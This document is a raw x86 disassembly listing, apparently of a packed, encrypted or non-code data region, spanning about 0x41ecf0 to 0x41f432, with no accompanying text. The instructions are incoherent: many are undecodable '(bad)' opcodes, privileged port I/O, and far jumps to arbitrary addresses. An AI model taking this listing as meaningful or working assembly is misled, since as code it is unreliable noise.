  41ecf0:	cmp    al,0x3c
  41ecf2:	inc    ebx
  41ecf3:	sub    eax,0x99b0e83
  41ecf8:	pop    edi
  41ecf9:	xchg   esi,eax
  41ecfa:	(bad)  
  41ecfb:	pop    esi
  41ecfc:	mov    bh,0xc1
  41ecfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecff:	mov    ecx,0x699ae240
  41ed04:	sub    eax,0xf0181af2
  41ed09:	xor    DWORD PTR [esi-0x30],0xffffffb6
  41ed0d:	or     DWORD PTR [ebx+0x252707b8],edi
  41ed13:	arpl   ax,bp
  41ed15:	xor    eax,DWORD PTR [edi]
  41ed17:	clc    
  41ed18:	out    dx,al
  41ed19:	lahf   
  41ed1a:	sti    
  41ed1b:	mov    ds:0xacc31511,eax
  41ed20:	cli    
  41ed21:	sub    BYTE PTR [ecx-0x18],bh
  41ed24:	(bad)  [ebx]
  41ed26:	rcl    DWORD PTR [ecx-0x1d],0x14
  41ed2a:	cmc    
  41ed2b:	icebp  
  41ed2c:	scas   al,BYTE PTR es:[edi]
  41ed2d:	data16 sub cl,bh
  41ed30:	hlt    
  41ed31:	daa    
  41ed32:	leave  
  41ed33:	arpl   WORD PTR [eax+0x4a],ax
  41ed36:	sbb    BYTE PTR [ebp-0x3f0d9ea3],0x8c
  41ed3d:	int    0x65
  41ed3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed40:	popa   
  41ed41:	add    bh,bh
  41ed43:	in     al,dx
  41ed44:	test   al,0x31
  41ed46:	(bad)  
  41ed48:	xor    al,0x42
  41ed4a:	rol    DWORD PTR [ebx],cl
  41ed4c:	scas   al,BYTE PTR es:[edi]
  41ed4d:	int3   
  41ed4e:	aad    0x6e
  41ed50:	push   esi
  41ed51:	retf   
  41ed52:	ret    0x8e90
  41ed55:	loope  0x41ed31
  41ed57:	push   ds
  41ed58:	or     al,0x45
  41ed5a:	(bad)  
  41ed5b:	pop    esp
  41ed5c:	and    eax,0xe4b88018
  41ed61:	jno    0x41eddb
  41ed63:	test   cl,ah
  41ed65:	pushf  
  41ed66:	repz fs adc al,0x82
  41ed6a:	sub    ebp,DWORD PTR [edx-0x7d]
  41ed6d:	add    eax,0x727c58e3
  41ed72:	lds    edx,FWORD PTR [esp+edx*2-0x2e]
  41ed76:	add    BYTE PTR [ebx],dh
  41ed78:	into   
  41ed79:	inc    edx
  41ed7a:	jmp    0x937f60cd
  41ed7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed80:	jbe    0x41ed49
  41ed82:	imul   ecx,DWORD PTR [ebx+0x7e],0xf9f6ce02
  41ed89:	xchg   ebx,eax
  41ed8a:	mov    ecx,0x3a5305d2
  41ed8f:	test   BYTE PTR [edi],ch
  41ed91:	or     al,0x1b
  41ed93:	pop    ss
  41ed94:	ror    ebx,0xb4
  41ed97:	jecxz  0x41edae
  41ed99:	scas   eax,DWORD PTR es:[edi]
  41ed9a:	test   BYTE PTR [ecx],dl
  41ed9c:	int    0x6c
  41ed9e:	ss loope 0x41ed7e
  41eda1:	(bad)  
  41eda2:	lea    esi,[esi+0x5fbe2000]
  41eda8:	or     ebx,DWORD PTR [ebx+0x5e]
  41edab:	jl     0x41ed94
  41edad:	fadd   QWORD PTR [ecx]
  41edaf:	add    DWORD PTR [ebx+ebp*8+0x69],edi
  41edb3:	or     eax,0xdbe7d040
  41edb8:	mov    ecx,0x86427291
  41edbd:	or     edx,DWORD PTR [edi+0x6b]
  41edc0:	sbb    al,0x55
  41edc2:	xor    cl,BYTE PTR [edx]
  41edc4:	sub    bh,cl
  41edc6:	cdq    
  41edc7:	cmp    bh,BYTE PTR [edx-0x67]
  41edca:	mov    BYTE PTR [edi+0x5],ah
  41edcd:	ret    
  41edce:	or     eax,0xe8544ed1
  41edd3:	xor    ah,cl
  41edd5:	daa    
  41edd6:	jnp    0x41ed98
  41edd8:	adc    ebx,DWORD PTR [ebp+ecx*4-0x40]
  41eddc:	jmp    0x751de6f9
  41ede1:	stos   BYTE PTR es:[edi],al
  41ede2:	ja     0x41edfa
  41ede4:	scas   eax,DWORD PTR es:[edi]
  41ede5:	sahf   
  41ede6:	cmp    BYTE PTR [ecx+0xc],ch
  41ede9:	jl     0x41edff
  41edeb:	and    BYTE PTR [eax+0x414f385c],cl
  41edf1:	xchg   eax,edi
  41edf3:	(bad)  [esi+ecx*8-0x42]
  41edf7:	add    eax,0x175c23cb
  41edfc:	loop   0x41ee01
  41edfe:	xchg   edx,eax
  41edff:	mov    cl,0x98
  41ee01:	inc    eax
  41ee02:	fs stos DWORD PTR es:[edi],eax
  41ee04:	dec    esi
  41ee05:	pop    esp
  41ee06:	jle    0x41edbe
  41ee08:	mov    ecx,0xaaf7b72c
  41ee0d:	inc    edx
  41ee0e:	xchg   edi,eax
  41ee0f:	dec    DWORD PTR [ebp-0x17]
  41ee12:	adc    al,0x58
  41ee14:	ret    0xa352
  41ee17:	call   0x79a17160
  41ee1c:	loopne 0x41ee42
  41ee1e:	adc    al,0xdb
  41ee20:	sub    BYTE PTR [edi+0x2a580b3d],ch
  41ee26:	(bad)  [eax+0x1c]
  41ee29:	mov    eax,ds:0x1753ffb5
  41ee2e:	popf   
  41ee2f:	pop    ss
  41ee30:	je     0x41ee8d
  41ee32:	cdq    
  41ee33:	mov    ds,WORD PTR [edi]
  41ee35:	xchg   ecx,eax
  41ee36:	sub    ebp,esp
  41ee38:	jne    0x41ee9d
  41ee3a:	inc    edi
  41ee3b:	pusha  
  41ee3c:	clc    
  41ee3d:	jns    0x41ee2e
  41ee3f:	fimul  WORD PTR [edi+0x1899f25a]
  41ee45:	add    DWORD PTR [edi-0x31],edi
  41ee48:	add    bh,BYTE PTR [ecx+0x26b8b1e2]
  41ee4e:	aam    0xc5
  41ee50:	mov    bh,0x1f
  41ee52:	inc    ebx
  41ee53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee54:	(bad)  
  41ee55:	pushf  
  41ee56:	jno    0x41ee87
  41ee58:	test   BYTE PTR [ecx+0x3],ch
  41ee5b:	xchg   ebp,eax
  41ee5c:	aad    0x94
  41ee5e:	push   es
  41ee5f:	mov    esi,0xba1ea07d
  41ee64:	mov    ds:0x2b733155,eax
  41ee69:	scas   eax,DWORD PTR es:[edi]
  41ee6a:	mov    ds:0x4fd3a423,al
  41ee6f:	lahf   
  41ee70:	xchg   ebp,eax
  41ee71:	into   
  41ee72:	jnp    0x41ee2b
  41ee74:	sbb    BYTE PTR [ebp+0x25],0x1a
  41ee78:	or     eax,0x9906b336
  41ee7d:	push   ds
  41ee7e:	(bad)  
  41ee7f:	adc    bl,BYTE PTR [ebx-0x58bafe84]
  41ee85:	scas   al,BYTE PTR es:[edi]
  41ee86:	push   0x366d03d
  41ee8b:	out    0x78,eax
  41ee8d:	ret    
  41ee8e:	imul   eax,eax,0xc
  41ee91:	pop    ebx
  41ee92:	push   esp
  41ee93:	es test eax,0xb3c8d1f6
  41ee99:	push   0x14
  41ee9b:	add    edi,edi
  41ee9d:	out    0x65,al
  41ee9f:	cmc    
  41eea0:	(bad)  
  41eea1:	ret    
  41eea2:	cmc    
  41eea3:	push   es
  41eea4:	add    BYTE PTR [eax],ah
  41eea6:	pop    edi
  41eea7:	jge    0x41ee7c
  41eea9:	dec    ebp
  41eeaa:	or     ebp,DWORD PTR [ecx]
  41eeac:	cmp    al,0x9c
  41eeae:	xor    al,0x38
  41eeb0:	arpl   WORD PTR [ebx-0x71],ax
  41eeb3:	sub    BYTE PTR [edi],0x13
  41eeb6:	inc    esi
  41eeb7:	push   ebp
  41eeb8:	sbb    DWORD PTR [ebx-0x75],eax
  41eebb:	sbb    bh,BYTE PTR [ecx-0x4d]
  41eebe:	sub    eax,0x10b4398f
  41eec3:	ds adc al,0xcf
  41eec6:	lds    esp,FWORD PTR ds:0x6f4ff8fb
  41eecc:	mov    al,0x57
  41eece:	and    edx,DWORD PTR [esi+0x50a38c56]
  41eed4:	xor    ebx,DWORD PTR [eax+esi*4+0x1c]
  41eed8:	je     0x41eefd
  41eeda:	(bad)  
  41eedb:	jno    0x41ee64
  41eedd:	mov    eax,ds:0x1e7de621
  41eee2:	push   edx
  41eee3:	pop    eax
  41eee4:	sub    al,0x9a
  41eee6:	aas    
  41eee7:	(bad)  
  41eee8:	cmp    BYTE PTR [esi],al
  41eeea:	push   ds
  41eeeb:	jne    0x41ef2f
  41eeed:	mov    WORD PTR [esi],?
  41eeef:	fcomp  QWORD PTR [ebp-0xaa6b086]
  41eef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eef6:	test   eax,esi
  41eef8:	xor    eax,0xc34786da
  41eefd:	les    esp,FWORD PTR [edx]
  41eeff:	test   BYTE PTR [bp+si],ch
  41ef02:	adc    eax,DWORD PTR [edi-0x35160268]
  41ef08:	icebp  
  41ef09:	rcr    ebp,0xaf
  41ef0c:	xor    BYTE PTR [edx+ecx*8-0x1c860bc2],dh
  41ef13:	pop    ecx
  41ef14:	sub    bh,BYTE PTR [eax]
  41ef16:	dec    ebp
  41ef17:	(bad)  
  41ef18:	fdiv   DWORD PTR [ecx*2-0x957772]
  41ef1f:	mov    ch,0xf1
  41ef21:	push   es
  41ef22:	das    
  41ef23:	xlat   BYTE PTR ds:[ebx]
  41ef24:	repz mul DWORD PTR [eax-0x5]
  41ef28:	jnp    0x41ef69
  41ef2a:	les    edx,FWORD PTR [edx]
  41ef2c:	out    0xf8,al
  41ef2e:	sbb    dh,0x84
  41ef31:	retf   0x3167
  41ef34:	and    ch,BYTE PTR [ecx-0x54c0d500]
  41ef3a:	shr    DWORD PTR [esi],cl
  41ef3c:	shr    bl,cl
  41ef3e:	lds    eax,FWORD PTR [edx-0x3d]
  41ef41:	mov    dl,dl
  41ef43:	fisub  DWORD PTR [edx-0x594c92a3]
  41ef49:	loop   0x41eef4
  41ef4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef4c:	scas   eax,DWORD PTR es:[edi]
  41ef4d:	mov    esi,0x6bd4c8ca
  41ef52:	dec    esp
  41ef53:	popa   
  41ef54:	out    0xa4,al
  41ef56:	fld    QWORD PTR [ebx+0x43]
  41ef59:	dec    esi
  41ef5a:	xchg   esp,eax
  41ef5b:	and    ebx,DWORD PTR [eax-0x17c7aa1d]
  41ef61:	sub    al,BYTE PTR [edi-0x68]
  41ef64:	dec    esi
  41ef65:	repnz ror DWORD PTR [ebx+0x70],1
  41ef69:	sbb    eax,0x840896fb
  41ef6e:	push   ss
  41ef6f:	adc    DWORD PTR [esp+edi*1-0x8],esi
  41ef73:	xchg   ebx,eax
  41ef74:	inc    ecx
  41ef75:	and    DWORD PTR [esi-0x1b05d12e],0x8bf99a9e
  41ef7f:	mov    dl,0xf1
  41ef81:	loope  0x41ef41
  41ef83:	inc    esp
  41ef84:	push   ds
  41ef85:	jmp    0x41efb0
  41ef87:	and    dh,BYTE PTR [ebp+0x83b13d8]
  41ef8d:	dec    eax
  41ef8e:	add    BYTE PTR [esi],dl
  41ef90:	cmc    
  41ef91:	mov    dh,0x7c
  41ef94:	fnstsw WORD PTR [eax]
  41ef96:	int    0x74
  41ef98:	mov    ah,0x3
  41ef9a:	xchg   DWORD PTR [ebx],eax
  41ef9c:	add    eax,0x7fdf702e
  41efa1:	jl     0x41ef7a
  41efa3:	mov    cl,0x66
  41efa5:	sub    eax,0x8e98f504
  41efaa:	mov    bl,0xed
  41efac:	or     DWORD PTR [esi],ebp
  41efae:	ins    DWORD PTR es:[edi],dx
  41efaf:	inc    edi
  41efb0:	sti    
  41efb1:	les    eax,FWORD PTR [ecx]
  41efb3:	jbe    0x41efdb
  41efb5:	cmp    BYTE PTR [esi-0x7be5bfc4],al
  41efbb:	push   edx
  41efbc:	mov    ebx,0x4c32d8dc
  41efc1:	dec    ebx
  41efc2:	push   esp
  41efc3:	stos   DWORD PTR es:[edi],eax
  41efc4:	hlt    
  41efc5:	mov    ecx,0x40d9ba0b
  41efca:	xor    dh,bh
  41efcc:	test   al,0x25
  41efce:	loopne 0x41ef7b
  41efd0:	push   ds
  41efd1:	shr    DWORD PTR [edx+0x4d042320],0x82
  41efd8:	xor    eax,0x574b8d52
  41efdd:	fst    QWORD PTR [eax]
  41efdf:	je     0x41eff4
  41efe1:	inc    eax
  41efe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efe3:	cdq    
  41efe4:	jp     0x41ef84
  41efe6:	xor    DWORD PTR [esi-0x1b343bac],edi
  41efec:	pshufw mm4,QWORD PTR [eax-0x38825a75],0x5d
  41eff4:	mov    al,ah
  41eff6:	mov    dl,0xb1
  41eff8:	xor    al,BYTE PTR [edi-0x31]
  41effb:	xor    esi,esi
  41effd:	and    eax,0x67276f0a
  41f002:	xor    al,0x7d
  41f004:	call   0x994d:0xb41f6910
  41f00b:	in     eax,0x9
  41f00d:	sub    ebp,edx
  41f00f:	jns    0x41f06b
  41f011:	mov    eax,0xb62c36f4
  41f016:	adc    BYTE PTR [edi+ebp*8+0x3e5feb74],bh
  41f01d:	xchg   edi,eax
  41f01e:	dec    ecx
  41f01f:	lock in al,0xb1
  41f022:	or     esp,DWORD PTR [eax]
  41f024:	imul   ecx,edx,0xffffffa8
  41f027:	add    DWORD PTR [esi],esp
  41f029:	jbe    0x41eff3
  41f02b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f02c:	push   ebp
  41f02d:	jbe    0x41efb8
  41f02f:	and    ebx,DWORD PTR [esi-0x36]
  41f032:	sbb    eax,DWORD PTR [eax+eiz*2]
  41f035:	xor    BYTE PTR [esi],0x3
  41f038:	inc    ecx
  41f039:	cdq    
  41f03a:	ret    
  41f03b:	repz sahf 
  41f03d:	mov    edi,0x3f243e4d
  41f042:	xor    cl,BYTE PTR [edx-0x6f]
  41f045:	inc    ecx
  41f046:	nop
  41f047:	scas   eax,DWORD PTR es:[edi]
  41f048:	cmp    ch,BYTE PTR [ecx]
  41f04a:	pop    edi
  41f04b:	lds    ebx,FWORD PTR [esi]
  41f04d:	sub    al,ah
  41f04f:	in     al,dx
  41f050:	sbb    al,0x97
  41f052:	cmp    eax,0xed52d3de
  41f057:	xchg   edi,eax
  41f058:	(bad)  
  41f059:	mov    BYTE PTR [edx-0x311c37],bl
  41f05f:	jge    0x41f059
  41f061:	add    eax,ebp
  41f063:	ins    BYTE PTR es:[edi],dx
  41f064:	mov    dl,0x4b
  41f066:	aam    0x49
  41f068:	ret    
  41f069:	cmp    ecx,edi
  41f06b:	mov    bl,0xb6
  41f06d:	inc    edi
  41f06e:	add    ecx,DWORD PTR [edi]
  41f070:	cld    
  41f071:	pop    edx
  41f072:	sub    BYTE PTR [esi],ah
  41f074:	xor    edx,DWORD PTR [edx-0x24]
  41f077:	fisubr WORD PTR [edx]
  41f079:	sub    ah,BYTE PTR [ecx]
  41f07b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f07c:	jne    0x41f067
  41f07e:	xor    al,0x2b
  41f080:	out    dx,eax
  41f081:	cld    
  41f082:	push   esp
  41f083:	outs   dx,DWORD PTR ds:[esi]
  41f084:	loope  0x41f0ea
  41f086:	sbb    eax,0x85657db8
  41f08b:	jns    0x41f0bd
  41f08d:	jne    0x41f0dc
  41f08f:	add    al,0x26
  41f091:	aaa    
  41f092:	into   
  41f093:	in     eax,0xd1
  41f095:	in     al,0x91
  41f097:	loop   0x41f0da
  41f099:	xchg   edi,eax
  41f09a:	enter  0x894b,0x2
  41f09e:	and    cl,cl
  41f0a0:	repnz (bad) [esp+ecx*1]
  41f0a4:	xor    bl,cl
  41f0a6:	clc    
  41f0a7:	pop    edx
  41f0a8:	fsubr  QWORD PTR [esi-0x19]
  41f0ab:	hlt    
  41f0ac:	repnz outs dx,BYTE PTR ds:[esi]
  41f0ae:	jo     0x41f124
  41f0b0:	repz inc ebx
  41f0b2:	inc    edx
  41f0b3:	pop    esp
  41f0b4:	repz sub bl,cl
  41f0b7:	call   DWORD PTR [eax]
  41f0b9:	jb     0x41f0c9
  41f0bb:	xchg   ebp,eax
  41f0bc:	cmp    ah,al
  41f0be:	adc    DWORD PTR [ecx],ecx
  41f0c0:	mov    BYTE PTR [ebx],ah
  41f0c2:	mov    eax,ds:0x4699718
  41f0c7:	xlat   BYTE PTR ds:[ebx]
  41f0c8:	xchg   ebx,eax
  41f0c9:	ins    DWORD PTR es:[edi],dx
  41f0ca:	mov    ds:0x7e985a60,eax
  41f0cf:	mov    bl,0xba
  41f0d1:	and    BYTE PTR [eax+ebx*8+0x64bd2a27],dl
  41f0d8:	or     BYTE PTR [eax],bh
  41f0da:	out    0x66,eax
  41f0dc:	in     al,0xbe
  41f0de:	sbb    BYTE PTR [eax],dl
  41f0e0:	jmp    0xbe77b19c
  41f0e5:	and    eax,0x315fdb19
  41f0ea:	dec    edx
  41f0eb:	push   0xf855957d
  41f0f0:	pop    es
  41f0f1:	rcr    BYTE PTR [ebx+0x5ff03d0d],cl
  41f0f7:	hlt    
  41f0f8:	out    dx,eax
  41f0f9:	sub    al,0xee
  41f0fb:	arpl   cx,bp
  41f0fd:	push   cs
  41f0fe:	sbb    al,BYTE PTR [edx-0x56cf1c92]
  41f104:	ja     0x41f139
  41f106:	xchg   ecx,eax
  41f107:	daa    
  41f108:	stc    
  41f109:	daa    
  41f10a:	test   eax,0xcf450f0d
  41f10f:	and    DWORD PTR [esi-0x4e2166ef],edi
  41f115:	call   0xf4942546
  41f11a:	jne    0x41f12b
  41f11c:	add    BYTE PTR [ecx-0x3e739770],ah
  41f122:	out    0x69,eax
  41f124:	xchg   edx,eax
  41f125:	fsub   QWORD PTR [ebp+0x3e]
  41f128:	jnp    0x41f155
  41f12a:	out    dx,eax
  41f12b:	mov    bl,0xbd
  41f12d:	xchg   BYTE PTR [eax+0x7bcc1c87],ch
  41f133:	(bad)  
  41f134:	mov    dh,BYTE PTR [edi+edi*4+0x7e0f6144]
  41f13b:	hlt    
  41f13c:	outs   dx,BYTE PTR ds:[esi]
  41f13d:	and    esi,DWORD PTR [edx-0x7d]
  41f140:	es iret 
  41f142:	xchg   DWORD PTR [esi+0x56],esp
  41f145:	fisub  DWORD PTR [ecx-0x79]
  41f148:	aas    
  41f149:	rcl    BYTE PTR [edi+0x1d],cl
  41f14c:	(bad)  
  41f14d:	jge    0x41f115
  41f14f:	adc    BYTE PTR [esi],cl
  41f151:	js     0x41f0d7
  41f153:	and    DWORD PTR [edx-0x2ce81284],ebp
  41f159:	std    
  41f15a:	dec    esi
  41f15b:	repz jmp 0x41f165
  41f15e:	out    0xe3,al
  41f160:	or     bh,al
  41f162:	je     0x41f150
  41f164:	aad    0xaf
  41f166:	imul   di,WORD PTR [ebx+ebx*1],0xd9ed
  41f16c:	jl     0x41f113
  41f16e:	mov    fs,WORD PTR [edx]
  41f170:	das    
  41f171:	shl    DWORD PTR [esi],1
  41f173:	sub    eax,0x87be9c2c
  41f178:	jle    0x41f15d
  41f17a:	ins    DWORD PTR es:[edi],dx
  41f17b:	mul    BYTE PTR [ebp-0x6d]
  41f17e:	out    0xc,al
  41f180:	clc    
  41f181:	jns    0x41f14a
  41f183:	dec    eax
  41f184:	jnp    0x41f112
  41f186:	fild   WORD PTR [esi+0x15124a0b]
  41f18c:	in     eax,dx
  41f18d:	xchg   esi,eax
  41f18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f18f:	fucomip st,st(4)
  41f191:	jnp    0x41f1c9
  41f193:	push   eax
  41f194:	lods   eax,DWORD PTR ds:[esi]
  41f195:	iret   
  41f196:	xchg   edx,eax
  41f197:	ins    DWORD PTR es:[edi],dx
  41f198:	aas    
  41f199:	push   ebp
  41f19a:	xor    edx,DWORD PTR [edx]
  41f19c:	jl     0x41f160
  41f19e:	aam    0xc4
  41f1a0:	xor    eax,DWORD PTR [ebx+0x3c58767d]
  41f1a6:	jge    0x41f1f3
  41f1a8:	sbb    ecx,DWORD PTR [esi-0x3d45752b]
  41f1ae:	repz and eax,DWORD PTR [ecx+edx*2+0x31]
  41f1b3:	test   DWORD PTR [esi-0x72121caa],ebx
  41f1b9:	and    eax,0xff696854
  41f1be:	neg    DWORD PTR [esi-0x57]
  41f1c1:	mov    ds:0x5fbf7018,eax
  41f1c6:	dec    ebx
  41f1c7:	test   eax,0x9f7348e3
  41f1cc:	jno    0x41f238
  41f1ce:	cmp    cl,dl
  41f1d0:	xlat   BYTE PTR ds:[ebx]
  41f1d1:	pop    edi
  41f1d2:	adc    BYTE PTR [esi],cl
  41f1d4:	sub    eax,DWORD PTR [edx]
  41f1d6:	sbb    esp,DWORD PTR [eax-0x70535f49]
  41f1dc:	add    eax,0x6ccff84f
  41f1e1:	inc    edi
  41f1e2:	inc    edx
  41f1e3:	out    dx,eax
  41f1e4:	popf   
  41f1e5:	pop    esi
  41f1e6:	fwait
  41f1e7:	pop    ebp
  41f1e8:	sbb    eax,0x20fee021
  41f1ed:	sub    cl,BYTE PTR [edx]
  41f1ef:	in     al,0x24
  41f1f1:	popf   
  41f1f2:	or     ah,BYTE PTR [eax+0x13]
  41f1f5:	int3   
  41f1f6:	cdq    
  41f1f7:	sbb    bl,BYTE PTR [esi]
  41f1f9:	fadd   DWORD PTR [ecx]
  41f1fb:	and    eax,0x78921140
  41f200:	loop   0x41f272
  41f202:	lock pop edi
  41f204:	inc    ecx
  41f205:	(bad)  [edx*1+0x72dc2d8d]
  41f20c:	rcl    DWORD PTR [ecx],0x6b
  41f20f:	lods   eax,DWORD PTR ds:[esi]
  41f210:	ja     0x41f24e
  41f212:	fisttp WORD PTR ds:0x290a0ab9
  41f218:	add    al,BYTE PTR [esp+ebp*8+0x15c2d5e5]
  41f21f:	push   eax
  41f220:	sub    ch,BYTE PTR [edx+ecx*8-0x13]
  41f224:	(bad)  
  41f225:	pop    ecx
  41f226:	dec    ebx
  41f227:	jge    0x41f241
  41f229:	outs   dx,DWORD PTR ds:[esi]
  41f22a:	aaa    
  41f22b:	clc    
  41f22c:	fstp   QWORD PTR [esi-0x68]
  41f22f:	test   al,0xa5
  41f231:	push   0x7c
  41f233:	arpl   WORD PTR [ecx-0x2bca06ca],di
  41f239:	into   
  41f23a:	push   ebp
  41f23b:	test   eax,0x17d9f2fb
  41f240:	xchg   esi,eax
  41f241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f242:	push   ebp
  41f243:	int3   
  41f244:	icebp  
  41f245:	dec    esp
  41f246:	push   ebp
  41f247:	ss pop es
  41f249:	xor    esp,DWORD PTR [ebx+edx*8-0x774661b]
  41f250:	rcl    DWORD PTR [edi+0x44c0ffaf],cl
  41f256:	retf   
  41f257:	mov    dh,0x6a
  41f259:	jecxz  0x41f280
  41f25b:	mov    ch,0xeb
  41f25d:	inc    esp
  41f25e:	jle    0x41f2cc
  41f260:	add    BYTE PTR [ebx],dh
  41f262:	push   ecx
  41f263:	test   eax,0xf9c20904
  41f268:	add    DWORD PTR [ecx],edi
  41f26a:	iret   
  41f26b:	out    0xa,eax
  41f26d:	and    al,0xc9
  41f26f:	dec    esi
  41f270:	xor    eax,ebp
  41f272:	repz cmp BYTE PTR [ebx],dh
  41f275:	fidiv  WORD PTR [ebp-0x7e]
  41f278:	jecxz  0x41f230
  41f27a:	jmp    0xe966:0xd66fdcbc
  41f281:	ret    
  41f282:	sub    al,ah
  41f284:	imul   esp,eax,0x4f2d1e95
  41f28a:	and    eax,DWORD PTR [esi]
  41f28c:	mov    edx,0xa7b18c30
  41f291:	test   al,0xea
  41f293:	loop   0x41f217
  41f295:	test   al,0xdc
  41f297:	mov    cl,0x1a
  41f299:	ja     0x41f307
  41f29b:	mov    esp,0x3d10f094
  41f2a0:	pop    ds
  41f2a1:	add    BYTE PTR [ebx],0xb9
  41f2a4:	mov    ecx,DWORD PTR [eax]
  41f2a6:	pop    eax
  41f2a7:	call   0x60a7:0xa3ca7618
  41f2ae:	pop    edx
  41f2af:	shl    edx,0x33
  41f2b2:	retf   0xf28a
  41f2b5:	ss xlat BYTE PTR es:[ebx]
  41f2b8:	(bad)  
  41f2b9:	jg     0x41f322
  41f2bb:	cmp    BYTE PTR [ecx+0x66],dh
  41f2be:	popf   
  41f2bf:	push   0x74
  41f2c1:	adc    cl,BYTE PTR [eax+0x1db32c0c]
  41f2c7:	mov    esp,DWORD PTR [edi+0x5a323297]
  41f2cd:	das    
  41f2ce:	xchg   esi,eax
  41f2cf:	xor    DWORD PTR [esi+esi*8],ebx
  41f2d2:	jmp    0x318f6908
  41f2d7:	cmp    al,0x24
  41f2d9:	and    eax,0x337048ba
  41f2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2df:	mov    bh,0xd9
  41f2e1:	sbb    eax,0x74db994b
  41f2e6:	mov    edx,0x9cd670ff
  41f2eb:	and    DWORD PTR [ebp-0x1a],esi
  41f2ee:	ja     0x41f311
  41f2f0:	iret   
  41f2f1:	mov    DWORD PTR [esi],edx
  41f2f3:	jno    0x41f29d
  41f2f5:	xor    ecx,0x7b983109
  41f2fb:	sahf   
  41f2fc:	out    dx,eax
  41f2fd:	sub    eax,0x781186d4
  41f302:	dec    edx
  41f303:	pop    ebx
  41f304:	(bad)  
  41f305:	sub    eax,0x2ad6badc
  41f30a:	add    DWORD PTR gs:[edi-0x7311b41e],0x45
  41f312:	out    0xf1,eax
  41f314:	inc    ebx
  41f315:	ja     0x41f2ef
  41f317:	adc    ecx,edx
  41f319:	mov    eax,0xc4d1b94b
  41f31e:	pop    ecx
  41f31f:	xchg   ebp,eax
  41f320:	sub    al,0xee
  41f322:	jmp    0x359d6cd2
  41f327:	daa    
  41f328:	pushf  
  41f329:	adc    esp,DWORD PTR [edi+0x2e]
  41f32c:	mov    al,0xc3
  41f32e:	ret    
  41f32f:	out    dx,eax
  41f330:	mov    ds:0x3805ce21,al
  41f335:	pop    eax
  41f336:	popf   
  41f337:	xchg   edi,eax
  41f338:	xor    BYTE PTR [ebx+0x4cb234df],bh
  41f33e:	mov    dh,0x36
  41f340:	imul   edi,edi,0xbb01cbd9
  41f346:	(bad)  
  41f348:	aad    0xf2
  41f34a:	popa   
  41f34b:	sahf   
  41f34c:	xchg   esp,eax
  41f34d:	mov    eax,0x23bf7fda
  41f352:	inc    esi
  41f353:	jecxz  0x41f397
  41f355:	sahf   
  41f356:	(bad)  
  41f357:	jae    0x41f391
  41f359:	retf   
  41f35a:	mov    eax,ds:0xb333370b
  41f35f:	int3   
  41f360:	adc    edx,ebp
  41f362:	inc    esp
  41f363:	add    BYTE PTR [eax+0x7b467b48],bh
  41f369:	out    0x3f,eax
  41f36b:	das    
  41f36c:	sub    eax,0xaf9630a1
  41f371:	scas   al,BYTE PTR es:[edi]
  41f372:	push   esi
  41f373:	repnz dec eax
  41f375:	dec    ebp
  41f376:	add    ah,ch
  41f378:	ss or  eax,0x2a7ae2aa
  41f37e:	xchg   edi,eax
  41f37f:	stos   DWORD PTR es:[edi],eax
  41f380:	lods   al,BYTE PTR ds:[esi]
  41f381:	lahf   
  41f382:	loopne 0x41f388
  41f384:	add    eax,0x884a1c32
  41f389:	or     eax,0x3abe1ca7
  41f38e:	pop    edx
  41f38f:	fwait
  41f390:	xlat   BYTE PTR ss:[ebx]
  41f392:	int    0x57
  41f394:	dec    ebp
  41f395:	pop    ds
  41f396:	or     esp,eax
  41f398:	ins    BYTE PTR es:[edi],dx
  41f399:	mov    esp,0x94d70e81
  41f39e:	inc    edi
  41f39f:	jae    0x41f3eb
  41f3a1:	int    0xee
  41f3a3:	bound  ebx,QWORD PTR [edi+0x2235df6c]
  41f3a9:	push   ecx
  41f3aa:	test   DWORD PTR [edx+0x3d],ebx
  41f3ad:	dec    esi
  41f3ae:	(bad)  
  41f3af:	mov    dh,0x4e
  41f3b1:	inc    ebp
  41f3b2:	sbb    bl,bl
  41f3b4:	fild   QWORD PTR [edx-0x4d7983c0]
  41f3ba:	jo     0x41f367
  41f3bc:	pop    esi
  41f3bd:	or     ah,ah
  41f3bf:	push   ds
  41f3c0:	lea    edx,[eax+0x6897c0e8]
  41f3c6:	adc    cl,BYTE PTR [eax-0x14c9e86a]
  41f3cc:	fld    QWORD PTR [esp+ecx*2]
  41f3cf:	sbb    al,al
  41f3d1:	sub    ah,BYTE PTR [ebp-0x1]
  41f3d4:	xor    ebp,edi
  41f3d6:	xchg   DWORD PTR [esi],ebp
  41f3d8:	mov    dl,0xb4
  41f3da:	push   0xfffffff9
  41f3dc:	cmp    eax,0xe43d8432
  41f3e1:	into   
  41f3e2:	mov    ds:0x3f77f904,al
  41f3e7:	rcr    DWORD PTR [ebx+edi*1],0xa
  41f3eb:	mov    DWORD PTR [eax-0x1f3526ec],0xe5efb9a7
  41f3f5:	ds add edx,ebx
  41f3f8:	punpckhwd mm5,QWORD PTR [esi]
  41f3fb:	je     0x41f393
  41f3fd:	jnp    0x41f3d9
  41f3ff:	mov    ebx,0x8a44de37
  41f404:	popa   
  41f405:	push   edx
  41f406:	pop    esp
  41f407:	xor    al,0x45
  41f409:	cmp    ebx,DWORD PTR [edi+edi*2]
  41f40c:	jl     0x41f445
  41f40e:	fisttp QWORD PTR [edx+0x3ce27308]
  41f414:	stos   DWORD PTR es:[edi],eax
  41f415:	pop    ebp
  41f416:	or     DWORD PTR [ebp-0x78eb9cef],edx
  41f41c:	dec    edi
  41f41d:	xor    al,0x87
  41f41f:	and    BYTE PTR [edi-0xb654a2],al
  41f425:	xchg   edi,eax
  41f426:	pop    es
  41f427:	movntq QWORD PTR [ebx],mm7
  41f42a:	dec    eax
  41f42b:	push   eax
  41f42c:	push   ebx
  41f42d:	bound  ax,DWORD PTR [eax+0x6c]
  41f431:	push   ss
  41f432:	push   edx
